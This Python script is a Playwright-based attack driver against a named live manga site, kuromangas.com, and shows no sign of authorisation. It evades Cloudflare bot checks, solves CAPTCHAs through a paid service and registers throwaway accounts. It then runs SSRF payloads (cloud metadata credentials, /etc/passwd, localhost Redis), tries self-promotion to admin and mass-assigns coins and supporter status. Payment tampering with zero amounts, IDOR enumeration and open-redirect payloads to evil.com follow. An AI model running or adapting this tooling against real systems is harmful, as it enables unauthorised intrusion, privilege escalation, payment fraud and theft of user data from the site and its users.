#!/usr/bin/env python3
"""Phase 6 webapp attack driver for kuromangas.com.

Uses a real browser (Playwright chromium) to bypass CF managed challenge +
invisible Turnstile per-request (browser handles natively). Visible Turnstile
on /register solved via 2captcha. Captures encrypted (_v_secure) responses +
datakey headers; decrypts offline with enum/decryptor.py.

Secrets (cf_clearance, session cookies, _kn nonce, account creds, 2captcha key)
NEVER written to repo. Stored in /tmp/kuromangas_session.json (chmod 600) and
/tmp/kuromangas_creds.json (chmod 600).

Subcommands:
  register   — create test account (2captcha visible turnstile) + login + save session
  session    — load saved session, sanity-check /api/auth/me
  probe      — probe admin/staff/payments/users/etc endpoints with user session (RBAC bypass hunt)
  decrypt    — decrypt all captured responses in webapp/caps/ -> webapp/decrypted/
  privesc    — PUT /api/admin/users/<me>/role {role:admin} + profile mass-assignment
  ssrf       — GET /api/proxy/image?url=... probes
  idor       — enumerate IDs on mangas/chapters/users/lists/notifications
  openredir  — /login?redirect=... probes
  devroutes  — /dev/* /read/*-preview probes
  all        — run full pipeline (register, session, probe, privesc, ssrf, idor, openredir, devroutes, decrypt)
"""
import asyncio, json, os, sys, time, subprocess, random, string, base64
from playwright.async_api import async_playwright

BASE = "https://kuromangas.com"
HOSTNAME = "kuromangas.com"
REPO = "/home/ubuntu/kuromangas.com"
WEBAPP = REPO + "/webapp"
CAPS = WEBAPP + "/caps"
DEC = WEBAPP + "/decrypted"
ENUM = REPO + "/enum"
DECRYPTOR = ENUM + "/decryptor.py"

SESSION_FILE = "/tmp/kuromangas_session.json"   # cookies, _kn, user — chmod 600, NOT in repo
CREDS_FILE = "/tmp/kuromangas_creds.json"         # account email/password/username — NOT in repo

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
VISIBLE_SITEKEY = "0x4AAAAAAB4bmY_nVKCLa6xx"
INVISIBLE_SITEKEY = "0x4AAAAAACHqmOixyAt5OjJM"

os.makedirs(CAPS, exist_ok=True)
os.makedirs(DEC, exist_ok=True)
for f in (SESSION_FILE, CREDS_FILE):
    if not os.path.exists(f):
        open(f, "w").close()
    os.chmod(f, 0o600)

def log(*a): print("[*]", *a, flush=True)
def warn(*a): print("[!]", *a, *a, file=sys.stderr, flush=True)
def rand(n=8):
    return "".join(random.choices(string.ascii_lowercase+string.digits, k=n))

def save_cap(name, cap):
    p = os.path.join(CAPS, name)
    with open(p, "w") as f: json.dump(cap, f, indent=2, ensure_ascii=False)
    return p

def decrypt_cap(cap):
    """Decrypt one captured response (dict with body/datakey/date) using decryptor.py.
    Returns (plain_text, err_str)."""
    if not isinstance(cap, dict):
        return None, "not a dict"
    body = cap.get("body","")
    if "_v_secure" not in (body or ""):
        return body, None
    dk = cap.get("datakey") or cap.get("dk")
    date = cap.get("date") or time.strftime("%Y-%m-%d", time.gmtime())
    b64 = body
    if isinstance(b64, str) and b64.lstrip().startswith("{"):
        try:
            obj = json.loads(b64)
            if isinstance(obj, dict) and "_v_secure" in obj:
                b64 = obj["_v_secure"]
        except Exception: pass
    args = [sys.executable, DECRYPTOR, "--b64", b64, "--date", date,
            "--hostname", HOSTNAME]
    if dk: args += ["--datakey", dk]
    try:
        out = subprocess.run(args, capture_output=True, text=True, timeout=30)
        if out.returncode != 0:
            return None, out.stderr.strip()
        return out.stdout.strip(), None
    except Exception as e:
        return None, str(e)

def decrypt_all():
    log("decrypting all captured responses...")
    n=0
    for fn in sorted(os.listdir(CAPS)):
        if not fn.endswith(".json"): continue
        p = os.path.join(CAPS, fn)
        try: cap = json.load(open(p))
        except Exception: continue
        if not isinstance(cap, dict): continue
        body = cap.get("body","")
        if "_v_secure" not in (body or ""):
            continue
        plain, err = decrypt_cap(cap)
        dp = os.path.join(DEC, fn)
        with open(dp, "w") as f:
            f.write("# source: %s\n# url: %s\n# status: %s\n# datakey: %s\n\n"
                    % (fn, cap.get("url",""), cap.get("status"), cap.get("datakey")))
            f.write(plain if plain else ("ERROR: %s" % err))
        n+=1
        log("  decrypted %s -> %s" % (fn, dp))
    log("decrypted %d responses" % n)

async def _launch(p, headless=True):
    b = await p.chromium.launch(
        headless=headless,
        args=["--no-sandbox","--disable-blink-features=AutomationControlled",
              "--disable-dev-shm-usage"])
    ctx = await b.new_context(user_agent=UA, viewport={"width":1366,"height":900},
                              locale="pt-BR", java_script_enabled=True)
    return b, ctx

async def clear_cf(page, ctx):
    """Navigate to an api endpoint to trigger CF challenge; wait until cleared."""
    log("clearing CF challenge...")
    for attempt in range(15):
        try:
            r = await page.goto(BASE+"/api/health", wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(2500)
            txt = await page.content()
            if "Just a moment" in txt or "challenge" in txt.lower() or "cf-chl" in txt.lower():
                log("  CF challenge page (attempt %d), waiting..." % attempt)
                await page.wait_for_timeout(6000)
                continue
            # try to read body as JSON (challenge cleared)
            body = await page.evaluate("()=>document.body.innerText")
            return True, body
        except Exception as e:
            log("  nav attempt %d: %s" % (attempt, str(e)[:80]))
            await page.wait_for_timeout(3000)
    return False, None

async def api_fetch(page, method, ep, payload=None, extra_headers=None, as_json=True):
    """fetch /api/<ep> with credentials; returns {status,datakey,body,headers}."""
    url = BASE + "/api/" + ep.lstrip("/")
    js = """
    async ([u,m,p,h])=>{
      const hdrs={'x-crypto-version':'v4.8'};
      if(h) for(const k in h) hdrs[k]=h[k];
      const opt={method:m,credentials:'include',headers:hdrs};
      if(p){ hdrs['content-type']='application/json'; opt.body=JSON.stringify(p); }
      try{
        const r=await fetch(u,opt);
        let body=''; try{body=await r.text()}catch(e){body='<err>'}
        const H={}; r.headers.forEach((v,k)=>H[k]=v);
        return {status:r.status, dk:H['x-kuro-datakey'], cv:H['x-crypto-version'], ct:H['content-type'], body};
      }catch(e){ return {err:String(e)} }
    }
    """
    r = await page.evaluate(js, [url, method, payload, extra_headers or {}])
    r["url"] = url; r["ep"] = ep; r["method"] = method
    r["date"] = time.strftime("%Y-%m-%d", time.gmtime())
    return r

async def get_nonce(page, ctx):
    """Read cookie `_kn` (JS-legible nonce) from the browser context."""
    cookies = await ctx.cookies()
    for c in cookies:
        if c["name"] == "_kn":
            return c["value"]
    return None

async def save_session(ctx, user=None, extra=None):
    cookies = await ctx.cookies()
    sess = {"cookies": cookies, "_kn": None, "user": user, "saved_at": time.strftime("%Y-%m-%dT%H:%M:%SZ")}
    for c in cookies:
        if c["name"] == "_kn": sess["_kn"] = c["value"]
    if extra: sess.update(extra)
    with open(SESSION_FILE, "w") as f: json.dump(sess, f, indent=2)
    os.chmod(SESSION_FILE, 0o600)
    return sess

async def load_session(ctx):
    if not os.path.exists(SESSION_FILE) or os.path.getsize(SESSION_FILE)==0:
        return None
    sess = json.load(open(SESSION_FILE))
    await ctx.add_cookies(sess.get("cookies", []))
    return sess

# ---------------------------------------------------------------------------
# Phase A: register + login
# ---------------------------------------------------------------------------
async def cmd_register(ctx_args=None):
    # generate disposable-ish account (we use a real email format; verification TBD)
    import importlib.util
    spec = importlib.util.spec_from_file_location("twocaptcha", WEBAPP+"/twocaptcha.py")
    twoc = importlib.util.module_from_spec(spec); spec.loader.exec_module(twoc)

    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        ok, body = await clear_cf(pg, ctx)
        if not ok:
            warn("CF not cleared — abort"); await b.close(); return None
        log("CF cleared. /api/health:", (body or "")[:120])

        # check if we already have a valid session (re-run idempotent)
        me = await api_fetch(pg, "GET", "users/me/profile")
        if me["status"]==200 and "_v_secure" in me.get("body",""):
            plain,_ = decrypt_cap(me)
            log("already logged in:", plain[:160])
            await save_session(ctx, extra={"me": plain})
            await b.close(); return plain

        # create credentials
        tag = "k"+rand(6)
        username = "bot"+rand(6)
        email = "%s@kurotest.mail.tm" % tag   # placeholder; may need real verification
        password = "Kuro9Test#" + rand(4)  # letters + digits required
        nick = username
        log("registering: user=%s email=%s" % (username, email))

        # solve visible Turnstile via 2captcha
        log("solving visible Turnstile via 2captcha...")
        try:
            token = twoc.solve_turnstile(VISIBLE_SITEKEY, BASE+"/register",
                                         timeout=180)
            log("got turnstile token len=%d" % len(token))
        except Exception as e:
            warn("turnstile solve failed: %s" % e); await b.close(); return None

        body = {"username":username,"nickname":nick,"email":email,
                "password":password,"confirmPassword":password,"turnstileToken":token}
        r = await api_fetch(pg, "POST", "auth/register", payload=body)
        save_cap("register.json", r)
        log("register status=%s body[:200]=%s" % (r["status"], (r.get("body") or "")[:200]))
        plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
        log("register decrypted:", (plain or "")[:300])

        if r["status"] not in (200, 201):
            warn("register failed — trying login anyway in case email not required")

        # login
        r = await api_fetch(pg, "POST", "auth/login", payload={"email":email,"password":password})
        save_cap("login.json", r)
        log("login status=%s body[:200]=%s" % (r["status"], (r.get("body") or "")[:200]))
        plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
        log("login decrypted:", (plain or "")[:300])

        # get me
        await pg.wait_for_timeout(1500)
        me = await api_fetch(pg, "GET", "users/me/profile")
        save_cap("auth_me.json", me)
        plain_me,_ = decrypt_cap(me) if "_v_secure" in (me.get("body") or "") else (me.get("body"),None)
        log("auth/me status=%s decrypted:", me["status"], (plain_me or "")[:400])

        # save creds + session OUTSIDE repo
        with open(CREDS_FILE, "w") as f:
            json.dump({"username":username,"nickname":nick,"email":email,
                       "password":password}, f, indent=2)
        os.chmod(CREDS_FILE, 0o600)
        sess = await save_session(ctx, user=plain_me, extra={"email":email,"username":username})
        log("session saved to", SESSION_FILE, "(_kn=%s)" % (sess.get("_kn") or "<none>"))
        await b.close()
        return plain_me

# ---------------------------------------------------------------------------
# Phase B: probe endpoints (RBAC bypass hunt) — READ-ONLY / non-destructive
# ---------------------------------------------------------------------------
ADMIN_GET_EPS = [
    "admin/verify-access", "admin/users", "admin/settings", "admin/admin-logs",
    "admin/bot-tokens", "admin/mangas", "admin/chapters", "admin/chapters/reported",
    "admin/comments", "admin/comments/reported", "admin/deletion-requests",
    "admin/deletion-requests/count", "admin/events", "admin/gamification/metrics",
    "admin/gamification/settings", "admin/grants", "admin/profanity",
    "admin/reading-history/all", "admin/supporters", "admin/supporters/gif-failures",
    "admin/titles", "admin/users/reported", "admin/anilist/stats",
    "admin/badges",
]
STAFF_GET_EPS = [
    "staff/users", "staff/borders", "staff/borders/multi", "staff/comments/reported",
    "staff/scan-manga-requests", "staff/upload-ranking", "staff/users/reported",
]
OTHER_EPS = [
    "payments/list", "payments/supporter-status",
    "users/me/profile", "users/me/settings", "users/me/library", "users/me/history",
    "users/me/coins/balance", "users/me/cosmetics", "users/me/titles", "users/me/borders",
    "notifications/count", "notifications/settings", "notifications/mangas",
    "anilist/status", "scans/me/my-scans", "user/channel", "uploads/editor",
    "users/ranking", "lists/explore", "mangas/genres", "mangas/people",
    "events/active", "caps/h", "caps/semana",
]

async def cmd_probe():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        ok, body = await clear_cf(pg, ctx)
        if not ok: warn("CF not cleared"); await b.close(); return
        sess = await load_session(ctx)
        if not sess: warn("no session — run register first"); await b.close(); return
        log("loaded session _kn=%s user=%s" % (sess.get("_kn"), (sess.get("user") or "")[:60]))
        nonce = sess.get("_kn")
        # add X-Session-Nonce header to all requests (mutative) — for GET probes not strictly needed but include
        hdrs = {}
        if nonce: hdrs["X-Session-Nonce"] = nonce

        results = []
        async def probe_list(lst, tag):
            log("== probing %s (%d endpoints) ==" % (tag, len(lst)))
            for ep in lst:
                r = await api_fetch(pg, "GET", ep, extra_headers=hdrs)
                r["tag"] = tag
                fn = "%s_GET_%s.json" % (tag, ep.replace("/","_"))
                save_cap(fn, r)
                sec = "_v_secure" in (r.get("body") or "")
                body_preview = r.get("body","")[:90]
                # decrypt if SEC
                plain = None
                if sec:
                    plain,_ = decrypt_cap(r)
                    body_preview = (plain or "")[:90]
                results.append({"ep":ep,"tag":tag,"status":r["status"],"sec":sec,
                                "preview":body_preview})
                flag = ""
                if tag in ("admin","staff") and r["status"]==200:
                    flag = " <<< RBAC BYPASS CANDIDATE"
                log("  [%s] %s %s dk=%s %s%s" % (tag, r["status"], ep, (r.get("dk") or "")[:10],
                    body_preview.replace("\n"," "), flag))
                await pg.wait_for_timeout(700)
        await probe_list(ADMIN_GET_EPS, "admin")
        await probe_list(STAFF_GET_EPS, "staff")
        await probe_list(OTHER_EPS, "other")
        with open(os.path.join(CAPS,"_probe_summary.json"),"w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        # also capture cookies
        await save_session(ctx)
        await b.close()
        log("probe done. summary in _probe_summary.json")
        return results

# ---------------------------------------------------------------------------
# Phase C: privesc — C-2 admin role + C-4 profile mass-assignment
# ---------------------------------------------------------------------------
async def cmd_privesc():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        ok, body = await clear_cf(pg, ctx)
        if not ok: warn("CF not cleared"); await b.close(); return
        sess = await load_session(ctx)
        if not sess: warn("no session"); await b.close(); return
        nonce = sess.get("_kn")
        hdrs = {}
        if nonce: hdrs["X-Session-Nonce"] = nonce
        # get my user id from auth/me
        me = await api_fetch(pg, "GET", "users/me/profile", extra_headers=hdrs)
        plain_me,_ = decrypt_cap(me) if "_v_secure" in (me.get("body") or "") else (me.get("body"),None)
        save_cap("privesc_auth_me.json", me)
        log("auth/me:", (plain_me or "")[:400])
        my_id = None
        try:
            obj = json.loads(plain_me) if plain_me else None
            if isinstance(obj, dict):
                my_id = obj.get("id") or obj.get("user_id") or obj.get("userId") or obj.get("_id")
                if not my_id and isinstance(obj.get("profile"), dict):
                    my_id = obj["profile"].get("id")
                if not my_id and isinstance(obj.get("user"), dict):
                    my_id = obj["user"].get("id")
        except Exception: pass
        log("my_id=", my_id)

        # C-2: PUT /api/admin/users/<me>/role {role:admin}
        if my_id:
            r = await api_fetch(pg, "PUT", "admin/users/%s/role" % my_id,
                                payload={"role":"admin"}, extra_headers=hdrs)
            save_cap("privesc_C2_self_admin_role.json", r)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            log("C-2 self-promote admin: status=%s body=%s" % (r["status"], (plain or r.get("body"))[:200]))
            # also try promote to uploader (smaller jump, less likely to alert)
            r2 = await api_fetch(pg, "PUT", "admin/users/%s/role" % my_id,
                                 payload={"role":"uploader"}, extra_headers=hdrs)
            save_cap("privesc_C2_self_uploader_role.json", r2)
            plain2,_ = decrypt_cap(r2) if "_v_secure" in (r2.get("body") or "") else (r2.get("body"),None)
            log("C-2 self-promote uploader: status=%s body=%s" % (r2["status"], (plain2 or r2.get("body"))[:200]))

        # C-9: staff promote-to-uploader on self
        if my_id:
            r = await api_fetch(pg, "PUT", "staff/users/%s/promote-to-uploader" % my_id,
                                payload=None, extra_headers=hdrs)
            save_cap("privesc_C9_staff_promote.json", r)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            log("C-9 staff promote-to-uploader: status=%s body=%s" % (r["status"], (plain or r.get("body"))[:200]))

        # C-4: PUT /api/users/me/profile with injected flags (mass-assignment)
        ma_payloads = [
            {"role":"admin"},
            {"is_master_admin":True},
            {"is_supporter":True,"supporter_expires_at":"2099-12-31"},
            {"coins":999999},
            {"role":"admin","is_master_admin":True,"is_supporter":True,
             "supporter_expires_at":"2099-12-31","coins":999999},
        ]
        for i,payload in enumerate(ma_payloads):
            r = await api_fetch(pg, "PUT", "users/me/profile", payload=payload, extra_headers=hdrs)
            save_cap("privesc_C4_profile_ma_%d.json" % i, r)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            log("C-4 profile MA #%d %s: status=%s body=%s" % (i, payload, r["status"], (plain or r.get("body"))[:200]))
            await pg.wait_for_timeout(800)

        # re-check me after attempts
        me2 = await api_fetch(pg, "GET", "users/me/profile", extra_headers=hdrs)
        plain_me2,_ = decrypt_cap(me2) if "_v_secure" in (me2.get("body") or "") else (me2.get("body"),None)
        save_cap("privesc_auth_me_after.json", me2)
        log("auth/me after privesc:", (plain_me2 or "")[:600])
        await save_session(ctx, user=plain_me2)
        await b.close()
        return plain_me2

# ---------------------------------------------------------------------------
# Phase D: SSRF C-1
# ---------------------------------------------------------------------------
async def cmd_ssrf():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        ok, body = await clear_cf(pg, ctx)
        if not ok: warn("CF not cleared"); await b.close(); return
        sess = await load_session(ctx)
        if not sess: warn("no session"); await b.close(); return
        nonce = sess.get("_kn")
        hdrs = {}
        if nonce: hdrs["X-Session-Nonce"] = nonce
        targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://localhost/",
            "http://127.0.0.1/",
            "http://localhost:8080/",
            "file:///etc/passwd",
            "http://[::1]/",
            "https://kuromangas.com/api/admin/users",
            "https://cdn.kuromangas.com/",
            "http://localhost:3000/",
            "http://localhost:5173/",
            "dict://localhost:6379/INFO",
        ]
        for i,t in enumerate(targets):
            ep = "proxy/image?url=" + t
            r = await api_fetch(pg, "GET", ep, extra_headers=hdrs)
            save_cap("ssrf_%02d.json" % i, r)
            preview = r.get("body","")[:120].replace("\n"," ")
            log("SSRF %s -> status=%s ct=%s body[:120]=%s" % (t, r["status"], r.get("ct"), preview))
            await pg.wait_for_timeout(900)
        await b.close()

# ---------------------------------------------------------------------------
# Phase E: IDOR C-5
# ---------------------------------------------------------------------------
async def cmd_idor():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        ok, body = await clear_cf(pg, ctx)
        if not ok: warn("CF not cleared"); await b.close(); return
        sess = await load_session(ctx)
        if not sess: warn("no session"); await b.close(); return
        nonce = sess.get("_kn")
        hdrs = {}
        if nonce: hdrs["X-Session-Nonce"] = nonce
        idor_eps = []
        for i in range(1,11):
            idor_eps += [
                ("mangas/%d" % i, "mangas"),
                ("mangas/%d/chapters" % i, "mangas"),
                ("chapters/%d" % i, "chapters"),
                ("chapters/%d/details" % i, "chapters"),
                ("users/%d" % i, "users"),
                ("users/%d/library" % i, "users"),
                ("lists/%d" % i, "lists"),
                ("scans/%d" % i, "scans"),
                ("scans/%d/logs" % i, "scans"),
            ]
        # notifications 1..5 (GET only — no DELETE)
        for i in range(1,6):
            idor_eps.append(("notifications/%d/read" % i, "notifications"))
        results=[]
        for ep,tag in idor_eps:
            r = await api_fetch(pg, "GET", ep, extra_headers=hdrs)
            r["tag"]=tag
            save_cap("idor_%s_%s.json" % (tag, ep.replace("/","_")), r)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            preview = (plain or r.get("body") or "")[:80].replace("\n"," ")
            results.append({"ep":ep,"status":r["status"],"preview":preview})
            log("IDOR %s -> %s %s" % (ep, r["status"], preview))
            await pg.wait_for_timeout(500)
        with open(os.path.join(CAPS,"_idor_summary.json"),"w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        await b.close()

# ---------------------------------------------------------------------------
# Phase F: open redirect C-6 + dev routes C-7
# ---------------------------------------------------------------------------
async def cmd_openredir():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        # these are SPA routes — no CF challenge typically (static HTML) but go through CF
        payloads = [
            "//evil.com", "https://evil.com", "javascript:alert(1)",
            "/%5Cevil.com", "//evil.com%2f..", "/\\evil.com",
            "//evil.com@kuromangas.com", "https://evil.com/",
        ]
        results=[]
        for pl in payloads:
            url = BASE + "/login?redirect=" + pl
            try:
                # navigate and capture final URL
                r = await pg.goto(url, wait_until="domcontentloaded", timeout=15000)
                final = pg.url
                # check if the SPA redirected (JS) by waiting
                await pg.wait_for_timeout(2000)
                final2 = pg.url
                results.append({"payload":pl,"nav_url":url,"final":final2,
                                "status":r.status if r else None})
                log("openredir payload=%s final=%s status=%s" % (pl, final2, r.status if r else None))
            except Exception as e:
                log("openredir payload=%s ERR %s" % (pl, str(e)[:80]))
                results.append({"payload":pl,"err":str(e)})
        with open(os.path.join(CAPS,"_openredir_summary.json"),"w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        await b.close()

async def cmd_devroutes():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        sess = await load_session(ctx)
        nonce = sess.get("_kn") if sess else None
        hdrs = {}
        if nonce: hdrs["X-Session-Nonce"] = nonce
        routes = ["/dev","/dev/","/read/dev","/read/error-preview","/read/novel-preview",
                  "/dev/api","/dev/tokens","/dev/flags"]
        results=[]
        for r_ in routes:
            try:
                resp = await pg.goto(BASE+r_, wait_until="domcontentloaded", timeout=15000)
                await pg.wait_for_timeout(1500)
                title = await pg.title()
                body_snip = (await pg.evaluate("()=>document.body.innerText.slice(0,200)")) if False else ""
                results.append({"route":r_,"status":resp.status if resp else None,
                                "final":pg.url,"title":title})
                log("devroute %s -> %s title=%s" % (r_, resp.status if resp else None, title[:60]))
            except Exception as e:
                results.append({"route":r_,"err":str(e)[:80]})
                log("devroute %s ERR %s" % (r_, str(e)[:80]))
        # also probe /api/dev* endpoints
        await clear_cf(pg, ctx)
        for ep in ["dev","dev/tokens","dev/flags","dev/reset","dev/maintenance"]:
            r = await api_fetch(pg, "GET", ep, extra_headers=hdrs)
            save_cap("devroute_api_%s.json" % ep.replace("/","_"), r)
            log("dev api %s -> %s %s" % (ep, r["status"], (r.get("body") or "")[:80]))
            results.append({"api_ep":ep,"status":r["status"],"body":(r.get("body") or "")[:120]})
        with open(os.path.join(CAPS,"_devroutes_summary.json"),"w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        await b.close()

# ---------------------------------------------------------------------------
# Phase B2: payments — C-3 mass-assignment + verify replay + status IDOR
# ---------------------------------------------------------------------------
async def cmd_payments():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        ok, body = await clear_cf(pg, ctx)
        if not ok: warn("CF not cleared"); await b.close(); return
        sess = await load_session(ctx)
        if not sess: warn("no session"); await b.close(); return
        nonce = sess.get("_kn")
        hdrs = {}
        if nonce: hdrs["X-Session-Nonce"] = nonce
        # first: list my payments + supporter-status to learn schema
        for ep in ["payments/list","payments/supporter-status"]:
            r = await api_fetch(pg, "GET", ep, extra_headers=hdrs)
            save_cap("pay_%s.json" % ep.replace("/","_"), r)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            log("pay GET %s -> %s %s" % (ep, r["status"], (plain or r.get("body") or "")[:200]))
            await pg.wait_for_timeout(700)
        # C-3: create with various planId + extra fields (NON-destructive: we don't confirm card)
        creates = [
            {"planId":"free"},
            {"planId":"test"},
            {"planId":"1"},
            {"planId":"0"},
            {"planId":"-1"},
            {"planId":"1","price":0,"amount":0},
            {"planId":"1","is_supporter":True,"supporter_expires_at":"2099-12-31"},
            {"planId":"1","currency":"BRL","amount":0.01},
        ]
        for i,payload in enumerate(creates):
            r = await api_fetch(pg, "POST", "payments/create", payload=payload, extra_headers=hdrs)
            save_cap("pay_create_%02d.json" % i, r)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            log("pay create #%d %s -> %s %s" % (i, payload, r["status"], (plain or r.get("body") or "")[:200]))
            await pg.wait_for_timeout(900)
        # IDOR on payments/status/<id> — enumerate 1..10
        for i in range(1,11):
            r = await api_fetch(pg, "GET", "payments/status/%d" % i, extra_headers=hdrs)
            save_cap("pay_status_idor_%d.json" % i, r)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            log("pay status IDOR %d -> %s %s" % (i, r["status"], (plain or r.get("body") or "")[:80]))
            await pg.wait_for_timeout(500)
        # verify replay — try a few ids (POST verify is mutative but typically just verifies; non-destructive intent)
        for i in range(1,6):
            r = await api_fetch(pg, "POST", "payments/verify/%d" % i, payload={}, extra_headers=hdrs)
            save_cap("pay_verify_replay_%d.json" % i, r)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            log("pay verify replay %d -> %s %s" % (i, r["status"], (plain or r.get("body") or "")[:120]))
            await pg.wait_for_timeout(600)
        await b.close()

# ---------------------------------------------------------------------------
async def cmd_session():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        ok, body = await clear_cf(pg, ctx)
        if not ok: warn("CF not cleared"); await b.close(); return
        sess = await load_session(ctx)
        if not sess: warn("no session file"); await b.close(); return
        nonce = sess.get("_kn")
        hdrs = {}
        if nonce: hdrs["X-Session-Nonce"] = nonce
        me = await api_fetch(pg, "GET", "users/me/profile", extra_headers=hdrs)
        save_cap("session_check_auth_me.json", me)
        plain,_ = decrypt_cap(me) if "_v_secure" in (me.get("body") or "") else (me.get("body"),None)
        log("auth/me status=%s" % me["status"])
        log("decrypted:", (plain or "")[:600])
        await b.close()
        return plain

CMDS = {
    "register": cmd_register, "session": cmd_session, "probe": cmd_probe,
    "privesc": cmd_privesc, "ssrf": cmd_ssrf, "idor": cmd_idor,
    "openredir": cmd_openredir, "devroutes": cmd_devroutes,
    "payments": cmd_payments, "decrypt": decrypt_all,
}

async def cmd_all():
    order = ["register","session","probe","privesc","ssrf","idor","payments",
             "openredir","devroutes","decrypt"]
    for c in order:
        log("==== running %s ====" % c)
        try:
            await CMDS[c]()
        except Exception as e:
            import traceback; traceback.print_exc()
            warn("%s failed: %s" % (c, e))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(1)
    cmd = sys.argv[1]
    if cmd == "all":
        asyncio.run(cmd_all())
    elif cmd == "decrypt":
        decrypt_all()
    elif cmd in CMDS:
        asyncio.run(CMDS[cmd]())
    else:
        print("unknown command:", cmd); print(__doc__); sys.exit(1)
